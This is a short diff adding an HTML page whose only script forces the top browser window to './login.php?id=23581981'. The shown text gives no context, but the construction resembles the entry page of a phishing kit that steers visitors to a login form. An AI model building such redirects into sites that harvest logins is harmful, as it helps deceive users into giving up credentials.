@@ -1,0 +1,7 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<script language="javascript">
+var sirawdi = "./login.php?id=23581981"        
+top.location = sirawdi;
+</script> 
+</head>
+</html>
